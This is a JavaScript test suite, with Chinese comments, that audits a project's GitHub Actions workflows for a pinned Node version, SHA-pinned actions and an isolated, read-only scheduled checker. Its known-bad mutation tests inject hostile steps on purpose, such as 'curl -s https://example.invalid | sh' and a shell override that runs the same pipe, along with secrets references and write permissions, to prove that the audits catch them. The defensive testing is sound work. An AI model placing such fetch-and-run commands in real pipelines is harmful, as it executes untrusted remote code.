// CI 設定契約（Workstream E，2026-10-27）：Node 釘住單一來源 + 明確 runner 標籤 + SHA 釘住 + 排程檢查器隔離。
// 零依賴、離線；對 workflow 檔做「行為導向」的文字稽核。所有檢查都抽成純函式，CI-6 以文字變異的 known-bad 臂證明
// 每條檢查都會 RED（非恆真）。
//
// 稽核前先經 normalizeYaml()（跨模型審查 Grok R2/R3）：引號鍵（`"node-version":`）、鍵與冒號間空白（`node-version :`）、
// 大小寫（Actions 的 `with:` 輸入名不分大小寫）、尾註解（`exfil: # note`）都是合法且會被 GitHub 接受的寫法——
// 只匹配裸鍵的正則會被它們繞過。另外 CI-5b 以「正規化後的 canonical form 等式」釘住 node-pin-check.yml 的整體結構
// （只允許 action SHA / 版本註解 / cron 變動），使任何語義稽核沒想到的新步驟 / 鍵都 RED（縱深）。
//   CI-1 .node-version 為精確 X.Y.Z 且主版本 == APPROVED_MAJOR（22）。刻意升主版本線必須有意識地改這個常數。
//   CI-2 pages.yml：每個 job 各恰有一個 setup-node 且以 node-version-file: .node-version 取用；全檔無任何 node-version 鍵。
//   CI-3 pages.yml + node-pin-check.yml：每個 runs-on 都是明確的 ubuntu-26.04。
//   CI-4 每個 uses: 都是 GitHub-owned、40-hex SHA 釘住並帶 # vX.Y.Z 註解。
//   CI-5 node-pin-check.yml 隔離：只有 schedule + workflow_dispatch；恰一個頂層 permissions = contents: read；無任何 write；
//        無 secrets/GITHUB_TOKEN；無 Pages/deploy/environment；單一 job；uses 白名單 {checkout, setup-node}；
//        run 白名單 {node scripts/check-node-pin.mjs}；無 shell/env/container/services；timeout-minutes。
//   CI-5b node-pin-check.yml canonical form（正規化後、SHA/cron 以 placeholder 取代）== 內嵌模板。
//   CI-6 known-bad 臂。
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';

const ROOT = new URL('../', import.meta.url);
const PAGES = readFileSync(new URL('.github/workflows/pages.yml', ROOT), 'utf8');
const PIN_CHECK = readFileSync(new URL('.github/workflows/node-pin-check.yml', ROOT), 'utf8');
const NODE_VERSION_FILE = readFileSync(new URL('.node-version', ROOT), 'utf8');

export const APPROVED_MAJOR = 22; // Owner-approved CI line (2026-10-27). Changing it is a conscious decision, not maintenance.
const RUNNER_LABEL = 'ubuntu-26.04';
const PIN_CHECK_ALLOWED_USES = ['actions/checkout', 'actions/setup-node'];
const PIN_CHECK_RUN = 'node scripts/check-node-pin.mjs';

// ── 正規化 ─────────────────────────────────────────────────────────────────
function lines(text) { return text.split('\n'); }
function indentOf(l) { return l.match(/^ */)[0].length; }
function isComment(l) { return /^\s*#/.test(l); }

// 每一非註解行：鍵去引號、鍵小寫、去「鍵與冒號間空白」。值與尾註解保留（uses 的 `# vX.Y.Z` 需要）。
export function normalizeYaml(text) {
  return lines(text).map((l) => {
    if (isComment(l)) return l;
    const m = l.match(/^(\s*(?:- )?)(["']?)([A-Za-z0-9_.-]+)\2\s*:(.*)$/);
    if (!m) return l;
    return `${m[1]}${m[3].toLowerCase()}:${m[4]}`;
  }).join('\n');
}
// 鍵行的尾註解去除（只用於結構比對 / job id 擷取；不用於 uses 釘住檢查）
function stripTrailingComment(l) { return isComment(l) ? l : l.replace(/\s+#.*$/, ''); }

// ── 純函式稽核（皆以正規化文字工作）──────────────────────────────────────────
export function auditNodeVersionFile(text) {
  const problems = [];
  const v = text.trim();
  if (!/^\d+\.\d+\.\d+$/.test(v)) problems.push(`.node-version must be an exact X.Y.Z (no ranges, aliases or v-prefix), got: "${v}"`);
  else if (Number(v.split('.')[0]) !== APPROVED_MAJOR) problems.push(`.node-version major ${v.split('.')[0]} != approved ${APPROVED_MAJOR} (moving major lines is an Owner decision — update APPROVED_MAJOR consciously)`);
  if (text !== `${v}\n`) problems.push('.node-version must be exactly the version plus one trailing newline');
  return problems;
}

// 以「`- uses:` / `- name:` 開頭的行」切出步驟區塊（含其後更深縮排的行）。
export function stepBlocks(text) {
  const ls = lines(normalizeYaml(text)); const blocks = []; let cur = null;
  for (const l of ls) {
    if (/^\s*- (name|uses):/.test(l)) { if (cur) blocks.push(cur); cur = { indent: indentOf(l), text: [l] }; continue; }
    if (cur && (l.trim() === '' || indentOf(l) > cur.indent || isComment(l))) { cur.text.push(l); continue; }
    if (cur) { blocks.push(cur); cur = null; }
  }
  if (cur) blocks.push(cur);
  return blocks.map((b) => b.text.join('\n'));
}

export function auditUsesPinning(text) {
  const problems = [];
  for (const l of lines(normalizeYaml(text))) {
    const m = l.match(/^\s*(?:- )?uses:\s*(\S+)(.*)$/);
    if (!m) continue;
    const [, ref, rest] = m;
    if (!/^[^@\s]+@[0-9a-f]{40}$/.test(ref)) problems.push(`uses not pinned to a 40-hex commit SHA: ${ref}`);
    if (!/^\s*#\s*v\d+\.\d+\.\d+\s*$/.test(rest)) problems.push(`uses lacks the "# vX.Y.Z" release comment: ${ref}`);
    if (!/^actions\//.test(ref)) problems.push(`uses is not a GitHub-owned action (repo policy = GitHub-owned only): ${ref}`);
  }
  return problems;
}

export function auditRunsOn(text) {
  const problems = [];
  const found = lines(normalizeYaml(text)).filter((l) => /^\s*runs-on:/.test(l));
  if (!found.length) problems.push('no runs-on found');
  for (const l of found) {
    const v = stripTrailingComment(l).replace(/^\s*runs-on:\s*/, '').trim().replace(/^["']|["']$/g, '');
    if (v !== RUNNER_LABEL) problems.push(`runs-on must be the explicit GA label ${RUNNER_LABEL}, got: ${v}`);
  }
  return problems;
}

export function auditSetupNode(text, { expectedSteps }) {
  const problems = [];
  const norm = normalizeYaml(text);
  const steps = stepBlocks(text).filter((b) => /uses:\s*actions\/setup-node@/.test(b));
  if (steps.length !== expectedSteps) problems.push(`expected ${expectedSteps} setup-node steps, found ${steps.length}`);
  for (const s of steps) {
    if (!/^\s*node-version-file:\s*["']?\.node-version["']?\s*(#.*)?$/m.test(s)) problems.push('setup-node step does not consume node-version-file: .node-version');
    if (/^\s*node-version:/m.test(s)) problems.push('setup-node step still carries a node-version key (second source of truth; setup-node prefers it over the file)');
    if (/^\s*check-latest:\s*true/m.test(s)) problems.push('setup-node step sets check-latest: true (reproducibility contract forbids it)');
  }
  if (/^\s*node-version:/m.test(norm)) problems.push('workflow contains a node-version key somewhere');
  return problems;
}

// jobs: 區塊內 2 空白縮排的鍵 = job 名稱（允許引號、尾註解；GitHub job id：字母/底線起首，含數字 - _）。
export function jobNames(text) {
  const m = normalizeYaml(text).match(/^jobs:\n([\s\S]*)$/m);
  return m ? (m[1].match(/^  [a-z_][a-z0-9_-]*:\s*(#.*)?$/gm) || []).map((j) => stripTrailingComment(j).trim().replace(':', '')) : [];
}
export function jobBlocks(text) {
  const m = normalizeYaml(text).match(/^jobs:\n([\s\S]*)$/m);
  if (!m) return {};
  const out = {}; let cur = null;
  for (const l of m[1].split('\n')) {
    const h = stripTrailingComment(l).match(/^  ([a-z_][a-z0-9_-]*):\s*$/);
    if (h) { cur = h[1]; out[cur] = []; continue; }
    if (cur) out[cur].push(l);
  }
  return Object.fromEntries(Object.entries(out).map(([k, v]) => [k, v.join('\n')]));
}

export function auditPagesWorkflow(text) {
  const names = jobNames(text);
  const problems = [
    ...auditUsesPinning(text),
    ...auditRunsOn(text),
    ...auditSetupNode(text, { expectedSteps: 3 }),
    ...(names.length === 3 ? [] : [`expected 3 jobs (validate, browser-smoke, deploy), found ${names.length}: ${names.join(', ')}`]),
  ];
  for (const [job, block] of Object.entries(jobBlocks(text))) {
    const n = (block.match(/uses:\s*actions\/setup-node@/g) || []).length;
    if (n !== 1) problems.push(`job "${job}" must have exactly one setup-node step consuming .node-version, found ${n}`);
  }
  return problems;
}

export function auditPinCheckWorkflow(text) {
  const norm = normalizeYaml(text);
  const nl = lines(norm);
  const problems = [...auditUsesPinning(text), ...auditRunsOn(text), ...auditSetupNode(text, { expectedSteps: 1 })];
  const onBlock = norm.match(/^on:\n((?:[ \t]+.*\n?)+)/m);
  if (!onBlock) problems.push('no on: block');
  else {
    const triggers = (onBlock[1].match(/^  ([a-z_]+):/gm) || []).map((t) => t.trim().replace(':', ''));
    const extra = triggers.filter((t) => !['schedule', 'workflow_dispatch'].includes(t));
    if (extra.length) problems.push(`pin-check must only be triggered by schedule/workflow_dispatch, found: ${extra.join(', ')}`);
    if (!triggers.includes('schedule')) problems.push('pin-check lacks a schedule trigger');
    if (!triggers.includes('workflow_dispatch')) problems.push('pin-check lacks the workflow_dispatch trigger (manual re-run after the 60-day schedule disablement)');
  }
  const permBlocks = nl.filter((l) => /^\s*permissions:/.test(l));
  if (permBlocks.length !== 1 || !/^permissions:\s*$/.test(stripTrailingComment(permBlocks[0] || ''))) problems.push(`pin-check must have exactly one top-level permissions: block, found ${permBlocks.length} (${permBlocks.map((l) => l.trim()).join(' | ')})`);
  const perms = norm.match(/^permissions:\n((?:[ \t]+.*\n?)+)/m);
  if (!perms) problems.push('pin-check lacks an explicit permissions: block');
  else if (stripTrailingComment(perms[1]).trim() !== 'contents: read') problems.push(`pin-check permissions must be exactly "contents: read", got: ${perms[1].trim().replace(/\n/g, ' | ')}`);
  for (const l of nl) {
    const s = stripTrailingComment(l);
    if (/^\s*[a-z-]+:\s*["']?write(-all)?["']?\s*$/.test(s) || /^\s*permissions:\s*["']?write-all["']?\s*$/.test(s)) problems.push(`pin-check must not hold any write permission: "${s.trim()}"`);
    if (/^\s*(shell|env|container|services|environment|defaults|strategy|outputs|secrets):/.test(s)) problems.push(`pin-check must not use "${s.trim().split(':')[0]}:" (no shell override, env, containers, services, environments or secrets in the isolated reporter)`);
  }
  if (/\$\{\{\s*secrets\./.test(norm) || /GITHUB_TOKEN/.test(norm)) problems.push('pin-check must not reference secrets or GITHUB_TOKEN');
  if (/(configure-pages|upload-pages-artifact|deploy-pages)/.test(norm)) problems.push('pin-check must not contain Pages/deploy actions');
  if (!/^\s*timeout-minutes:\s*\d+/m.test(norm)) problems.push('pin-check job lacks timeout-minutes');
  const uses = nl.map((l) => l.match(/^\s*(?:- )?uses:\s*([^@\s]+)@/)).filter(Boolean).map((m) => m[1]);
  for (const u of uses) if (!PIN_CHECK_ALLOWED_USES.includes(u)) problems.push(`pin-check may only use ${PIN_CHECK_ALLOWED_USES.join(', ')}; found ${u}`);
  if (uses.length !== 2) problems.push(`pin-check must have exactly 2 uses steps (checkout + setup-node), found ${uses.length}`);
  const runs = nl.filter((l) => /^\s*(?:- )?run:/.test(l)).map((l) => stripTrailingComment(l).replace(/^\s*(?:- )?run:\s*/, '').trim().replace(/^["']|["']$/g, ''));
  if (runs.length !== 1 || runs[0] !== PIN_CHECK_RUN) problems.push(`pin-check may only run "${PIN_CHECK_RUN}", found: [${runs.join(' | ')}]`);
  const withKeys = nl.filter((l) => /^\s{10}[a-z-]+:/.test(l)).map((l) => stripTrailingComment(l).trim().split(':')[0]);
  for (const k of withKeys) if (k !== 'node-version-file') problems.push(`pin-check setup-node may only pass node-version-file, found with-key "${k}"`);
  if (jobNames(text).length !== 1) problems.push(`pin-check must have exactly one job, found ${jobNames(text).length}`);
  return problems;
}

// CI-5b：canonical form —— 正規化、去註解/空行、SHA 與版本註解與 cron 以 placeholder 取代。
export function canonicalPinCheck(text) {
  return lines(normalizeYaml(text))
    .filter((l) => !isComment(l) && l.trim() !== '')
    .map((l) => l.replace(/@[0-9a-f]{40}\s*#\s*v\d+\.\d+\.\d+\s*$/, '@SHA # vX').replace(/cron:\s*["'][^"']+["'].*$/, 'cron: "CRON"'))
    .join('\n');
}
const PIN_CHECK_CANONICAL = [
  'name: Node pin check',
  'on:',
  '  schedule:',
  '    - cron: "CRON"',
  '  workflow_dispatch:',
  'permissions:',
  '  contents: read',
  'jobs:',
  '  check:',
  `    runs-on: ${RUNNER_LABEL}`,
  '    timeout-minutes: 5',
  '    steps:',
  '      - name: Checkout',
  '        uses: actions/checkout@SHA # vX',
  '      - name: Set up Node.js (from .node-version)',
  '        uses: actions/setup-node@SHA # vX',
  '        with:',
  '          node-version-file: ".node-version"',
  '      - name: Compare .node-version against the official Node.js release index and schedule',
  `        run: ${PIN_CHECK_RUN}`,
].join('\n');

function mutate(source, from, to) {
  const out = source.replace(from, to);
  assert.notEqual(out, source, `mutation did not apply: ${String(from).slice(0, 60)}`);
  return out;
}

// ── 契約 ────────────────────────────────────────────────────────────────────
test('CI-1: .node-version is an exact X.Y.Z on the approved major line', () => {
  assert.deepEqual(auditNodeVersionFile(NODE_VERSION_FILE), []);
  assert.match(NODE_VERSION_FILE.trim(), /^22\.\d+\.\d+$/);
});

test('CI-2: every job in pages.yml has exactly one setup-node step consuming .node-version; no node-version key anywhere', () => {
  assert.deepEqual(auditSetupNode(PAGES, { expectedSteps: 3 }), []);
  assert.deepEqual(auditPagesWorkflow(PAGES), []);
  assert.doesNotMatch(PAGES, /22\.23\.4/, 'the patch literal must not appear in the workflow any more (single source = .node-version)');
});

test('CI-3: every runs-on in pages.yml and node-pin-check.yml is the explicit ubuntu-26.04 label', () => {
  assert.deepEqual(auditRunsOn(PAGES), []);
  assert.deepEqual(auditRunsOn(PIN_CHECK), []);
  const codeLines = (PAGES + '\n' + PIN_CHECK).split('\n').filter((l) => !isComment(l));
  assert.equal(codeLines.filter((l) => /ubuntu-latest/.test(l)).length, 0, 'no non-comment line may reference ubuntu-latest');
  assert.deepEqual(jobNames(PAGES), ['validate', 'browser-smoke', 'deploy']);
  assert.deepEqual(jobNames(PIN_CHECK), ['check']);
});

test('CI-4: every uses: in both workflows is a GitHub-owned action pinned to a 40-hex SHA with a # vX.Y.Z comment', () => {
  assert.deepEqual(auditUsesPinning(PAGES), []);
  assert.deepEqual(auditUsesPinning(PIN_CHECK), []);
});

test('CI-5: node-pin-check.yml is isolated — schedule/dispatch only, contents: read only, no write/secrets/shell/env, allowlisted uses+run, one job, timeout', () => {
  assert.deepEqual(auditPinCheckWorkflow(PIN_CHECK), []);
  const sha = (t) => t.match(/actions\/setup-node@([0-9a-f]{40})/)[1];
  assert.equal(sha(PIN_CHECK), sha(PAGES));
});

test('CI-5b: node-pin-check.yml canonical form equals the frozen template (only action SHA/version comments and the cron may vary)', () => {
  assert.equal(canonicalPinCheck(PIN_CHECK), PIN_CHECK_CANONICAL);
});

test('CI-6: known-bad arms — each audit rule can actually fail, including quoted / spaced / cased / commented YAML variants', () => {
  // (a) literal node-version re-introduced, in bare, quoted, spaced and cased forms → CI-2 RED
  for (const variant of ['node-version: "22.23.4"', '"node-version": "24.22.1"', 'node-version : "24"', 'Node-Version: "24"']) {
    const t = mutate(PAGES, /node-version-file: "\.node-version"\n/, `node-version-file: ".node-version"\n          ${variant}\n`);
    assert.ok(auditSetupNode(t, { expectedSteps: 3 }).some((p) => /node-version key/.test(p)), `variant not caught: ${variant}`);
  }
  // (b) check-latest: true → RED
  const cl = mutate(PAGES, /node-version-file: "\.node-version"\n/, 'node-version-file: ".node-version"\n          check-latest: true\n');
  assert.ok(auditSetupNode(cl, { expectedSteps: 3 }).some((p) => /check-latest/.test(p)));
  // (c) a job dropped its setup-node → count + per-job RED
  const fewer = mutate(PAGES, /      - name: Set up Node\.js\n        uses: actions\/setup-node@[0-9a-f]{40} # v\d+\.\d+\.\d+\n        with:\n          node-version-file: "\.node-version"\n\n      - name: Configure Pages/, '      - name: Configure Pages');
  const fewerP = auditPagesWorkflow(fewer);
  assert.ok(fewerP.some((p) => /expected 3 setup-node steps, found 2/.test(p)) && fewerP.some((p) => /job "deploy" must have exactly one setup-node/.test(p)));
  // (d) rolling alias → CI-3 RED
  assert.ok(auditRunsOn(mutate(PAGES, /runs-on: ubuntu-26\.04/, 'runs-on: ubuntu-latest')).some((p) => /explicit GA label/.test(p)));
  // (e) tag-pinned / third-party action → CI-4 RED
  assert.ok(auditUsesPinning(mutate(PAGES, /actions\/checkout@[0-9a-f]{40} # v7\.0\.1/, 'actions/checkout@v7')).some((p) => /not pinned to a 40-hex/.test(p)));
  assert.ok(auditUsesPinning(mutate(PAGES, /actions\/checkout@/, 'someone/checkout@')).some((p) => /not a GitHub-owned action/.test(p)));
  // (f) extra jobs: underscore id, quoted id, id with trailing comment, no setup-node, with deploy perms → RED (Grok F3)
  for (const header of ['  pin_audit:', '  "exfil":', '  exfil: # note']) {
    const t = mutate(PAGES, /\njobs:\n/, `\njobs:\n${header}\n    runs-on: ubuntu-26.04\n    permissions:\n      pages: write\n      id-token: write\n    steps:\n      - run: echo hi\n`);
    const names = jobNames(t);
    assert.equal(names.length, 4, `job header not inventoried: ${header}`);
    const p = auditPagesWorkflow(t);
    assert.ok(p.some((x) => /expected 3 jobs/.test(x)) && p.some((x) => /must have exactly one setup-node step consuming \.node-version, found 0/.test(x)), `extra job not caught: ${header}`);
  }
  // (g) pin-check isolation arms: push trigger (bare + quoted), job-level permissions (bare + quoted write), environment, deploy action,
  //     secrets ref, missing dispatch, extra run, shell override, extra uses (github-script), second job, missing timeout → CI-5 RED
  const arms = [
    [/  workflow_dispatch:\n/, '  workflow_dispatch:\n  push:\n    branches: ["main"]\n', /only be triggered by schedule/],
    [/  workflow_dispatch:\n/, '  workflow_dispatch:\n  "pull_request_target":\n    branches: ["main"]\n', /only be triggered by schedule/],
    [/    timeout-minutes: 5\n/, '    timeout-minutes: 5\n    permissions:\n      actions: write\n', /must not hold any write permission: "actions: write"/],
    [/    timeout-minutes: 5\n/, '    timeout-minutes: 5\n    "permissions":\n      "contents": write\n      "pages": write\n', /must not hold any write permission: "contents: write"/],
    [/    timeout-minutes: 5\n/, '    timeout-minutes: 5\n    "environment": github-pages\n', /must not use "environment:"/],
    [/run: node scripts\/check-node-pin\.mjs\n/, 'run: node scripts/check-node-pin.mjs\n      - uses: actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346 # v5.0.1\n', /Pages\/deploy|may only use/],
    [/run: node scripts\/check-node-pin\.mjs\n/, 'run: node scripts/check-node-pin.mjs\n        env:\n          T: ${{ secrets.X }}\n', /secrets or GITHUB_TOKEN|must not use "env:"/],
    [/  workflow_dispatch:\n/, '', /lacks the workflow_dispatch/],
    [/run: node scripts\/check-node-pin\.mjs\n/, 'run: node scripts/check-node-pin.mjs\n      - run: curl -s https://example.invalid | sh\n', /may only run/],
    [/        run: node scripts\/check-node-pin\.mjs\n/, '        shell: bash -c "curl -s https://example.invalid | sh; {0}"\n        run: node scripts/check-node-pin.mjs\n', /must not use "shell:"/],
    [/run: node scripts\/check-node-pin\.mjs\n/, 'run: node scripts/check-node-pin.mjs\n      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1\n', /may only use actions\/checkout|exactly 2 uses/],
    [/\njobs:\n/, '\njobs:\n  other:\n    runs-on: ubuntu-26.04\n    steps:\n      - run: node scripts/check-node-pin.mjs\n', /exactly one job/],
    [/    timeout-minutes: 5\n/, '', /timeout-minutes/],
  ];
  for (const [from, to, expect] of arms) {
    const t = mutate(PIN_CHECK, from, to);
    assert.ok(auditPinCheckWorkflow(t).some((p) => expect.test(p)), `arm not caught: ${String(from).slice(0, 40)} → ${to.slice(0, 40)}`);
    assert.notEqual(canonicalPinCheck(t), PIN_CHECK_CANONICAL, 'canonical-form gate (CI-5b) must also go RED');
  }
  // (h) .node-version real predicate against known-bad values (not constant comparison)
  assert.deepEqual(auditNodeVersionFile('22.23.4\n'), []);
  assert.ok(auditNodeVersionFile('24.22.1\n').some((p) => /major 24 != approved 22/.test(p)));
  assert.ok(auditNodeVersionFile('22\n').some((p) => /exact X\.Y\.Z/.test(p)));
  assert.ok(auditNodeVersionFile('v22.23.4\n').some((p) => /exact X\.Y\.Z/.test(p)));
  assert.ok(auditNodeVersionFile('22.23.4\n\n').some((p) => /trailing newline/.test(p)));
  assert.ok(auditNodeVersionFile('22.23.4').some((p) => /trailing newline/.test(p)));
  // (i) canonical-form gate survives the ONLY legitimate drift (Dependabot SHA bump + version comment, cron edit)
  const bumped = PIN_CHECK.replace(/actions\/checkout@[0-9a-f]{40} # v7\.0\.1/, 'actions/checkout@' + 'f'.repeat(40) + ' # v7.1.0').replace(/cron: "17 6 \* \* 1"/, 'cron: "5 4 * * 2"');
  assert.notEqual(bumped, PIN_CHECK);
  assert.equal(canonicalPinCheck(bumped), PIN_CHECK_CANONICAL);
});
